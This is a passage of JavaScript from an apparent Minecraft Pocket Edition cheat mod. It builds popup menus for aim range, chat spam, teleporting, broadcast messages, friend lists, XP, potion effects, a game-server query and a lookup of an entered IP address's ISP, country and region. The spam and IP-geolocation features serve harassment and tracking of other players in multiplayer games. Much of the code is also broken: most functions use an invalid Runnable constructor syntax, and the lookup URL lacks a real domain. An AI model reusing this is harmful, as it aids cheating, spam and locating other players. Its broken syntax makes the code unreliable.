} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function setRange(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
if(typeof(parseInt(final)) == "number"){
aimrange = final;
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function setShadow(hint, hint2, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var input2 = new styleInput();
input2.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(input2);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
input2.setText("");
input2.setHint(hint2);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
final2 = input2.getText();
if(typeof(parseInt(final)) == "number" && typeof(parseInt(final2)) == "number"){
shadow1X = final;
shadow1Y = final2;
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function setPrefix(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
var final = input.getText()+"";
if(typeof(final) == "string"){
prefix = final;
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function setHeart(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
if(typeof(parseInt(final)) == "number"){
max = final;
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function discord(msg) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var yes = new styleButton();
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(yes);
layout.addView(Exit);
yes.setText(msg);
Exit.setText("No");
yes.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
var dis = new android.content.Intent(MainActivity);
dis.setAction(android.content.Intent.ACTION_VIEW);
dis.setData(android.net.Uri.parse("https://twitter.com/Inferno"));
MainActivity.startActivity(dis);
editor.dismiss();
}
});
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function doSpam(hint, hint2, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
var input2 = new styleInput();
input2.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(input2);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
input2.setText("");
input2.setHint(hint2);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText()+"";
final2 = input2.getText();
if(typeof(parseInt(final2)) == "number"){
text = final;
sec = final2;
que = true;
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function teleport(hint, hint2, hint3, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var input2 = new styleInput();
input2.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var input3 = new styleInput();
input3.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(input2);
layout.addView(input3);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
input2.setText("");
input2.setHint(hint2);
input3.setText("");
input3.setHint(hint3);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
final2 = input2.getText();
final3 = input3.getText();
if(typeof(parseInt(final)) == "number" || typeof(parseInt(final2)) == "number" || typeof(parseInt(final3)) == "number"){
x = parseInt(final);
y = parseInt(final2);
z = parseInt(final3);
Entity.setPosition(Player.getEntity(), x, y, z);
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function putTell(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText()+"";
if(typeof(final) == "string"){
sendToAll(final);
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function setFriend(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
var Exit = new styleButton();
				layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
var final = input.getText()+"";
if(typeof(final) == "string"){
Shadow.addFriend(Shadow.clean(final));
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function rmFriend(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
var Exit = new styleButton();
layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
var final = input.getText()+"";
if(typeof(final) == "string"){
Shadow.removeFriend(Shadow.clean(final));
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function query(hint, hint2, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
var input2 = new styleInput();
input2.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(input2);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
input2.setText("");
input2.setHint(hint2);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText()+"";
final2 = input2.getText()+"";
if(typeof(parseInt(final2)) == "number"){
ip = final;
port = final2;
print(ip + "\n" + parseInt(port));
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Query result");
if(typeof(queryServer(ip, parseInt(port))) != "undefined"){
/*alert.setMessage('Motd: '+srv.motd+'\nSoftware: '+srv.software+'\nVersion: '+srv.version+'\nOnline: '+srv.status+'\nMap: '+srv.map+'\nType: '+srv.game_type);*/
alert.setMessage(queryServer(ip, parseInt(port))+"");
} else {
alert.setMessage("Error."+"\n"+queryServer(ip, parseInt(port)));
}
var dialog = alert.create();
dialog.show();
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function exp(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
var final = input.getText();
if(typeof(parseInt(final)) == "number" || typeof(final) == "string"){
Player.addExp(final);
} else {
clientMessage("Invalid input.\n"+'"'+final+'"');
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function query2(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
var Exit = new styleButton();
layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText()+"";
if(typeof(final) == "number" || typeof(final) == "string"){
ip = final;
var squery = "http://ip-api/json/"+ip;
var contant = ModPE.getFromUrl(squery);
var iapi = ModPE.JSON.parse(contant);
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Query result");
alert.setMessage("IP: "+iapi.query+"\nISP: "+iapi.isp+"\nCountry: "+iapi.country+"\nState: "+iapi.regionName);
var dialog = alert.create();
dialog.show();
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function setElevator(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
if(typeof(parseInt(final)) == "number" || typeof(final) == "string"){
eheight = final;
elevatorRange = eheight;
} else {
clientMessage("Invalid input.\n"+'"'+final+'"');
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function setHeight(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
	layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
if(typeof(parseInt(final)) == "number" && final >= 1 && final <= 120){
jumpheight = final;
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

function setBlock(hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
	layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
final = input.getText();
if(typeof(parseInt(final)) == "number" && final >= 1 && final <= 120){
tblock = final;
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

/*
*
============
effect & enchant menus
============
*
*/

function effect_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var eLayout = new android.widget.LinearLayout(MainActivity);
var eScroll = new android.widget.HorizontalScrollView(MainActivity);
var eLayout1 = new android.widget.LinearLayout(MainActivity);
eLayout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
eLayout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
eScroll.addView(eLayout);
eLayout1.addView(eScroll);

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
effects.dismiss();
mainMenu();
}
}));
eLayout.addView(exit);

var e0 = new styleButton();
e0.setText("Clear");
e0.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
Entity.removeAllEffects(getPlayerEnt());
}
}));
eLayout.addView(e0);

var e1 = new styleButton();
e1.setText("Absorption");
e1.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(1, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e1);

var e2 = new styleButton();
e2.setText("Blindness");
e2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(2, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e2);

var e3 = new styleButton();
e3.setText("Confusion");
e3.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(3, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e3);

var e4 = new styleButton();
e4.setText("Strength");
e4.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(4, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e4);

var e5 = new styleButton();
e5.setText("Resistance");
e5.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(5, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e5);

var e6 = new styleButton();
e6.setText("Fatigue");
e6.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(6, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e6);

var e7 = new styleButton();
e7.setText("Haste");
e7.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(7, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e7);

var e8 = new styleButton();
e8.setText("Fatal poison");
e8.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(8, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e8);

var e9 = new styleButton();
e9.setText("Fire resistance");
e9.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(9, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e9);

var e10 = new styleButton();
e10.setText("Harm");
e10.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(10, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e10);

var e11 = new styleButton();
e11.setText("Heal");
e11.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(11, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e11);

var e12 = new styleButton();
e12.setText("Health boost");
e12.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(12, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e12);

var e13 = new styleButton();
e13.setText("Hunger");
e13.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(13, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e13);

var e14 = new styleButton();
e14.setText("Invisibility");
e14.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(14, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e14);

var e15 = new styleButton();
e15.setText("Jump boost");
e15.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(15, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e15);

var e16 = new styleButton();
e16.setText("Levitation");
e16.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(16, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e16);

var e17 = new styleButton();
e17.setText("Slowness");
e17.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(17, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e17);

var e18 = new styleButton();
e18.setText("Speed");
e18.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(18, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e18);

var e19 = new styleButton();
e19.setText("Night vision");
e19.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(19, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e19);

var e20 = new styleButton();
e20.setText("Poison");
e20.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(20, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e20);

var e21 = new styleButton();
e21.setText("Regeneration");
e21.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(21, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e21);

var e22 = new styleButton();
e22.setText("Saturation");
e22.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(22, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e22);

var e23 = new styleButton();
e23.setText("Water breathing");
e23.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(23, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e23);

var e24 = new styleButton();
e24.setText("Weakness");
e24.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(24, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e24);

var e25 = new styleButton();
e25.setText("Wither");
e25.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
effects.dismiss();
effect(25, "Seconds", "Strength", "Give effect");
}
}));
eLayout.addView(e25);

function effect(we, hint, hint2, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var input2 = new styleInput();
input2.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(input2);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
input2.setText("");
input2.setHint(hint2);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
s = input.getText();
l = input2.getText();
if(typeof(parseInt(s)) == "number" && typeof(parseInt(l)) == "number"){
if(we == 1)Entity.addEffect(getPlayerEnt(), MobEffect.absorption, s, l, false, true);
if(we == 2)Entity.addEffect(getPlayerEnt(), MobEffect.blindness, s, l, false, true);
if(we == 3)Entity.addEffect(getPlayerEnt(), MobEffect.confusion, s, l, false, true);
if(we == 4)Entity.addEffect(getPlayerEnt(), MobEffect.damageBoost, s, l, false, true);
if(we == 5)Entity.addEffect(getPlayerEnt(), MobEffect.damageResistance, s, l, false, true);
if(we == 6)Entity.addEffect(getPlayerEnt(), MobEffect.digSlowdown, s, l, false, true);
if(we == 7)Entity.addEffect(getPlayerEnt(), MobEffect.digSpeed, s, l, false, true);
if(we == 8)Entity.addEffect(getPlayerEnt(), MobEffect.fatalPoison, s, l, false, true);
if(we == 9)Entity.addEffect(getPlayerEnt(), MobEffect.fireResistance, s, l, false, true);
if(we == 10)Entity.addEffect(getPlayerEnt(), MobEffect.harm, s, l, false, true);
if(we == 11)Entity.addEffect(getPlayerEnt(), MobEffect.heal, s, l, false, true);
if(we == 12)Entity.addEffect(getPlayerEnt(), MobEffect.healthBoost, s, l, false, true);
if(we == 13)Entity.addEffect(getPlayerEnt(), MobEffect.hunger, s, l, false, true);
if(we == 14)Entity.addEffect(getPlayerEnt(), MobEffect.invisibility, s, l, false, true);
if(we == 15)Entity.addEffect(getPlayerEnt(), MobEffect.jump, s, l, false, true);
if(we == 16)Entity.addEffect(getPlayerEnt(), MobEffect.levitation, s, l, false, true);
if(we == 17)Entity.addEffect(getPlayerEnt(), MobEffect.movementSlowdown, s, l, false, true);
if(we == 18)Entity.addEffect(getPlayerEnt(), MobEffect.movementSpeed, s, l, false, true);
if(we == 19)Entity.addEffect(getPlayerEnt(), MobEffect.nightVision, s, l, false, true);
if(we == 20)Entity.addEffect(getPlayerEnt(), MobEffect.poison, s, l, false, true);
if(we == 21)Entity.addEffect(getPlayerEnt(), MobEffect.regeneration, s, l, false, true);
if(we == 22)Entity.addEffect(getPlayerEnt(), MobEffect.saturation, s, l, false, true);
if(we == 23)Entity.addEffect(getPlayerEnt(), MobEffect.waterBreathing, s, l, false, true);
if(we == 24)Entity.addEffect(getPlayerEnt(), MobEffect.weakness, s, l, false, true);
if(we == 25)Entity.addEffect(getPlayerEnt(), MobEffect.wither, s, l, false, true);
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
